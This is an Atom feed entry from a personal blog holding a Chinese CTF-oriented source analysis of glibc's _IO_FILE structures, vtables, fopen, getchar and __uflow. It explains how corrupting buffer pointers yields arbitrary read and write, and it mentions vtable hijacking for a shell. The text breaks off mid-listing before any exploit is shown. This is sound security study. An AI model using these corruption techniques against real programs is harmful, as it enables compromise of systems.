<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ditto&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-04-26T02:53:35.303Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>ditto</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>_IO_FILE部分源码分析及利用</title>
    <link href="http://yoursite.com/2019/04/24/IO-FILE%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2019/04/24/IO-FILE部分源码分析及利用/</id>
    <published>2019-04-24T03:13:36.000Z</published>
    <updated>2019-04-26T02:53:35.303Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>最近的题目(最近两年的国赛，HCTF2018)中出现了很多关于_IO_FILE的利用，不是house of orange中的伪造vtable，而是修改_IO_FILE结构体中的一些指针，达到任意读写的能力。<br>鉴于修改指针这方面的资料很少，只好自己读源码分析了。</p><h3 id="部分源码分析"><a href="#部分源码分析" class="headerlink" title="部分源码分析:"></a>部分源码分析:</h3><p>在linux系统中，打开文件的系统调用是open，当使用open函数打开一个文件后，会返回一个整数，这个整数就是文件描述符。<br>每个进程都有一个叫做task_struct的结构体（即PCB，process control block），用来保存进程的一些信息，这个结构体保存了<strong>文件描述符表</strong>指针，来记录该进程打开的文件。而文件描述符就是这个表的索引。<br>当程序启动后，会默认打开三个文件，stdin,stdout,stderr.分别为标准输入，标准输出，标准错误。对应的文件描述符是0,1,2.<br>linux下一切都当做文件对待，显示器，键盘等都当做文件，这里的标准输入对应的就是键盘，标准输出就是对应的显示器。</p><p>而c语言用一个指向_IO_FILE结构体的指针来操作其对应的文件，其中<strong>封装了文件描述符</strong>，这个FILE结构体中保存的有文件描述符，操作文件权限，<strong>_IO_缓冲区信息</strong>等。后面的任意读写漏洞就是出在了IO缓冲区这里。<br>当使用fopen函数打开一个文件后，会返回一个指向FILE结构体的指针。<br>如:<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="built_in">fp</span><span class="comment">;</span></span><br><span class="line"><span class="built_in">fp</span>=fopen(<span class="string">"xxx"</span>,<span class="string">"r"</span>)</span><br></pre></td></tr></table></figure></p><h4 id="IO-FILE结构体："><a href="#IO-FILE结构体：" class="headerlink" title="_IO_FILE结构体："></a>_IO_FILE结构体：</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">truct <span class="variable">_IO_FILE</span> &#123;</span><br><span class="line">  int <span class="variable">_flags</span>;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  char* <span class="variable">_IO_read_ptr</span>;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  char* <span class="variable">_IO_read_end</span>;<span class="comment">/* End of get area. */</span></span><br><span class="line">  char* <span class="variable">_IO_read_base</span>;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  char* <span class="variable">_IO_write_base</span>;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  char* <span class="variable">_IO_write_ptr</span>;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  char* <span class="variable">_IO_write_end</span>;<span class="comment">/* End of put area. */</span></span><br><span class="line">  char* <span class="variable">_IO_buf_base</span>;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  char* <span class="variable">_IO_buf_end</span>;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  char *<span class="variable">_IO_save_base</span>; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  char *<span class="variable">_IO_backup_base</span>;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  char *<span class="variable">_IO_save_end</span>; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">  struct <span class="variable">_IO_marker</span> *<span class="variable">_markers</span>;</span><br><span class="line">  struct <span class="variable">_IO_FILE</span> *<span class="variable">_chain</span>;</span><br><span class="line">  int <span class="variable">_fileno</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  int <span class="variable">_blksize</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  int <span class="variable">_flags2</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="variable">_IO_off_t</span> <span class="variable">_old_offset</span>; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  unsigned short <span class="variable">_cur_column</span>;</span><br><span class="line">  signed char <span class="variable">_vtable_offset</span>;</span><br><span class="line">  char <span class="variable">_shortbuf</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  <span class="variable">_IO_lock_t</span> *<span class="variable">_lock</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct <span class="variable">_IO_FILE_complete</span></span><br><span class="line">&#123;</span><br><span class="line">  struct <span class="variable">_IO_FILE</span> <span class="variable">_file</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  <span class="variable">_IO_off64_t</span> <span class="variable">_offset</span>;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  struct <span class="variable">_IO_codecvt</span> *<span class="variable">_codecvt</span>;</span><br><span class="line">  struct <span class="variable">_IO_wide_data</span> *<span class="variable">_wide_data</span>;</span><br><span class="line">  struct <span class="variable">_IO_FILE</span> *<span class="variable">_freeres_list</span>;</span><br><span class="line">  void *<span class="variable">_freeres_buf</span>;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  void *<span class="variable">__pad1</span>;</span><br><span class="line">  void *<span class="variable">__pad2</span>;</span><br><span class="line">  void *<span class="variable">__pad3</span>;</span><br><span class="line">  void *<span class="variable">__pad4</span>;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">  size_t <span class="variable">__pad5</span>;</span><br><span class="line">  int <span class="variable">_mode</span>;</span><br><span class="line">  <span class="comment">/* Make sure we don't get into trouble again.  */</span></span><br><span class="line">  char <span class="variable">_unused2</span>[<span class="number">15</span> * <span class="built_in">sizeof</span> (int) - <span class="number">4</span> * <span class="built_in">sizeof</span> (void *) - <span class="built_in">sizeof</span> (size_t)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>FILE结构体中有很多指针，<strong>这里重点关注一下这些指针</strong>:<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">char</span>* _IO_read_ptr;/* Current read pointer */</span><br><span class="line"><span class="built_in">char</span>* _IO_read_end;/* <span class="keyword">End</span> <span class="keyword">of</span> <span class="keyword">get</span> area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_read_base;/* Start <span class="keyword">of</span> putback+<span class="keyword">get</span> area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_write_base;/* Start <span class="keyword">of</span> put area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_write_ptr;/* Current put pointer. */</span><br><span class="line"><span class="built_in">char</span>* _IO_write_end;/* <span class="keyword">End</span> <span class="keyword">of</span> put area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_buf_base;/* Start <span class="keyword">of</span> reserve area. */</span><br><span class="line"><span class="built_in">char</span>* _IO_buf_end;/* <span class="keyword">End</span> <span class="keyword">of</span> reserve area. */</span><br></pre></td></tr></table></figure></p><p>这些指针记录了IO缓冲区的位置，和当前的读写位置。<br>c语言为了提高效率，为IO提供了缓冲区（这些缓冲区是默认分配在堆中的，也可以使用setbuf，setvbuf函数将输入输出与特定的缓存区相联系），<strong>当第一次对文件读的时候，会以页为单位，将文件中的内容读取到缓冲区中，以供程序后来的使用，避免了多次系统调用，降低了效率(用户态和内核态的切换的消耗很大)。同理，对文件进行写操作的时候，其实是先在缓冲区中写</strong>。如果修改这些指针，则可以达到任意读写的能力，但是需要搞清楚glibc是如何使用这些指针的。</p><p><strong>注意使用缓冲区的情况是使用c标准库的文件操作函数，如果你使用系统调用write，read等函数，是不使用缓冲区的，他直接将内容写入到对应的文件中（或直接从对应的文件中读取），因为write，read函数是直接使用文件描述符的，并不使用FILE结构。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br></pre></td></tr></table></figure><p>这个指针指向下个FILE结构，所有的FILE结构体是使用单向链表串起来的，链表头是_IO_list_all.<br>如图所示：<br><img src="https://github.com/Dittozzz/CTF-pwn-writeup/blob/master/_IO_FILE%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1.png?raw=true" alt=""></p><h4 id="IO-FILE-plus结构体："><a href="#IO-FILE-plus结构体：" class="headerlink" title="_IO_FILE_plus结构体："></a>_IO_FILE_plus结构体：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>_IO_FILE_plus结构体只是对_IO_FILE结构体进行了封装，增加了一个新成员：vtable，这个和c++里的vtable很像。其实fopen返回的是_IO_FILE_plus类型的指针。<br>vtable是指向_IO_jump_t结构体类型的指针，_IO_jumpt_t结构体的定义如下：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_jump_t</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">JUMP_FIELD(size_t, </span>__dummy)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(size_t, </span>__dummy2)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_finish_t, </span>__finish)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_overflow_t, </span>__overflow)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_underflow_t, </span>__underflow)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_underflow_t, </span>__uflow)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_pbackfail_t, </span>__pbackfail)<span class="comment">;</span></span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_xsputn_t, </span>__xsputn)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_xsgetn_t, </span>__xsgetn)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_seekoff_t, </span>__seekoff)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_seekpos_t, </span>__seekpos)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_setbuf_t, </span>__setbuf)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_sync_t, </span>__sync)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_doallocate_t, </span>__doallocate)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_read_t, </span>__read)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_write_t, </span>__write)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_seek_t, </span>__seek)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_close_t, </span>__close)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_stat_t, </span>__stat)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_showmanyc_t, </span>__showmanyc)<span class="comment">;</span></span><br><span class="line">    <span class="keyword">JUMP_FIELD(_IO_imbue_t, </span>__imbue)<span class="comment">;</span></span><br><span class="line">&#125;<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>其中<code>JUMP_FIELD</code>是一个宏：<code>#define JUMP_FIELD(TYPE, NAME) TYPE NAME</code></p><p>可以看出 _IO_jump_t 是一个函数指针表，里面存的是函数指针，用来以后的跳转。libc中的函数指针非常多，可以劫持libc中的函数指针来劫持程序的执行流。<br>house of orange 就是构造 fake vtable 来getshell的，这里只是提下这个技术，本篇重点不在这里，而是修改指向缓冲区的指针。<br>这个函数表中有两个很重要的函数：<strong>overflow，</strong>underflow，在后面分析实例函数的时候会提到。</p><h4 id="fopen函数"><a href="#fopen函数" class="headerlink" title="fopen函数:"></a>fopen函数:</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">__fopen_internal (const char *filename, const char *mode, int is32)</span><br><span class="line">&#123;</span><br><span class="line">  struct locked_FILE</span><br><span class="line">  &#123;</span><br><span class="line">    struct _IO_FILE_plus fp;</span><br><span class="line"><span class="meta">#ifdef _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#endif</span></span><br><span class="line">    struct _IO_wide_data wd;</span><br><span class="line">  &#125; *<span class="keyword">new</span><span class="type">_f</span> = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">new</span><span class="type">_f</span> == NULL) <span class="comment">//分配失败</span></span><br><span class="line">    <span class="keyword">return</span> NULL;</span><br><span class="line"><span class="meta">#ifdef _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">new</span><span class="type">_f</span>-&gt;fp.file._lock = &amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;lock;</span><br><span class="line"><span class="meta">#endif</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  _IO_no_init (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  _IO_no_init (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, NULL, NULL);</span><br><span class="line"><span class="meta">#endif</span></span><br><span class="line">  _IO_JUMPS (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new<span class="type">_file_init_internal</span> (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">  <span class="keyword">new</span><span class="type">_f</span>-&gt;fp.vtable = NULL;</span><br><span class="line"><span class="meta">#endif</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) <span class="keyword">new</span><span class="type">_f</span>, filename, mode, is32) != NULL)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;<span class="keyword">new</span><span class="type">_f</span>-&gt;fp);</span><br><span class="line">  free (<span class="keyword">new</span><span class="type">_f</span>);</span><br><span class="line">  <span class="keyword">return</span> NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_no_init函数是用来初始化的，他调用了<code>_IO_old_init</code><br>其定义如下：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_old_init (_IO_FILE *fp, int flags)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_flags = _IO_MAGIC|flags;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_flags2 = <span class="number">0</span>;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_buf_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_buf_end = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_read_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_read_ptr = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_read_end = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_write_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_write_ptr = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_write_end = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_chain = NULL; <span class="comment">/* Not necessary. */</span></span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_save_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_backup_base = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_save_end = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_markers = NULL;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_cur_column = <span class="number">0</span>;</span><br><span class="line">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_vtable_offset = <span class="number">0</span>;</span><br><span class="line">#endif</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  <span class="function"><span class="title">if</span> (fp-&gt;</span>_lock != NULL)</span><br><span class="line">    _IO_<span class="function"><span class="title">lock_init</span> (*fp-&gt;</span>_lock);</span><br><span class="line">#endif</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>将缓冲区指针初始化为NULL，还有一些其他初始化的操作。<br><code>_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</code><br><code>#define _IO_JUMPS(THIS) (THIS)-&gt;vtable</code><br><code>extern const struct _IO_jump_t _IO_file_jumps;</code><br>这里将vtable指向<code>_IO_file_jumps</code>。这步很重要，后面的输入输出函数都会用到。</p><p>真正完成打开文件操作的函数是_IO_file_fopen.<br><code># define _IO_new_file_fopen _IO_file_fopen</code><br>该函数就是根据传入的modes，例如”r”,”r+”等来设置flag位，最终调用open系统调用完成打开文件操作。</p><h4 id="getchar函数："><a href="#getchar函数：" class="headerlink" title="getchar函数："></a>getchar函数：</h4><p>这里以getchar函数为例，其他输入函数最终调用的函数是相同的。</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">getchar (void)</span><br><span class="line">&#123;</span><br><span class="line">  int result;</span><br><span class="line">  <span class="variable">_IO_acquire_lock</span> (<span class="variable">_IO_stdin</span>); <span class="comment">//获得锁</span></span><br><span class="line">  result = <span class="variable">_IO_getc_unlocked</span> (<span class="variable">_IO_stdin</span>);</span><br><span class="line">  <span class="variable">_IO_release_lock</span> (<span class="variable">_IO_stdin</span>); <span class="comment">//释放锁</span></span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在进行真正的读入操作前，先获得锁，这是因为在多线程的情况下，多个线程公用一个输入缓冲区，如果不加锁，当前线程正在读入的时候，由于调度，切换至另一个线程，如果他也在进行读入，则可能会读到相同的东西或者覆盖掉前一个线程读入的东西。</p><p>getchar 函数调用了函数<code>_IO_getc_unlocked</code>进行输入。<br>其定义如下：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _IO_getc_unlocked(_fp) \</span></span><br><span class="line">       <span class="function"><span class="params">(_IO_BE ((_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end, <span class="number">0</span>) <span class="string">\</span></span></span></span><br><span class="line"><span class="function"><span class="params">? __uflow (_fp) : *(unsigned char *) (_fp)-&gt;_IO_read_ptr++)</span></span></span><br></pre></td></tr></table></figure></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># define _IO_BE(<span class="name">expr</span>, res) __builtin_expect ((<span class="name">expr</span>), res)</span><br></pre></td></tr></table></figure><p>__builtin_expect在标准库中使用的地方很多，他并不改变比较的结果，只是表明这个比较结果很有可能是 true还是false，以便来优化汇编代码。详情可以百度下。</p><p><code>_IO_BE ((_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end, 0)</code> 这段代码只是表明<code>(_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end</code>很可能是false。<br>如果<code>(_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end</code>为true则执行<code>__uflow (_fp)</code>，否者执行<code>*(unsigned char *) (_fp)-&gt;_IO_read_ptr++)</code></p><p>看一下_IO_FILE结构中定义的_IO_read_ptr的注释:<code>Current read pointer</code>，<strong>他指的是当前的读入位置，即在输入缓冲区中的位置</strong>。<br>_IO_read_ptr的注释为<code>char* _IO_read_end;    /* End of get area. */</code> 读取缓冲区结束的位置。<br>之前已经说过，我们输入的东西其实是先保存在输入缓冲区中，如果_IO_read_ptr小于_IO_read_end则说明，并没有到输入缓冲区的尽头，则只需返回_IO_read_ptr所指向的一字节的内容，然后_IO_read_ptr的大小增加1，指向下一个字节。<br>如果_IO_read_ptr大于等于_IO_read_end，则说明已经读取到尽头，则需要重新从设备中读取数据到缓冲区，从这里可以看出，最初的时候，_IO_read_ptr是和_IO_read_end相等的，因为这样才会从键盘中进行读取，否者缓冲区中是没有内容的。</p><p>看一下__uflow的定义:<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line"><span class="variable">__uflow</span> (<span class="variable">_IO_FILE</span> *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">_IO_vtable_offset</span> (fp) == <span class="number">0</span> &amp;&amp; <span class="variable">_IO_fwide</span> (fp, -<span class="number">1</span>) != -<span class="number">1</span>)</span><br><span class="line">    return EOF;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_mode</span> == <span class="number">0</span>)</span><br><span class="line">    <span class="variable">_IO_fwide</span> (fp, -<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">_IO_in_put_mode</span> (fp))</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">_IO_switch_to_get_mode</span> (fp) == EOF)</span><br><span class="line">      return EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_read_ptr</span> &lt; fp-&gt;<span class="variable">_IO_read_end</span>)</span><br><span class="line">    return *(unsigned char *) fp-&gt;<span class="variable">_IO_read_ptr</span>++;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">_IO_in_backup</span> (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span 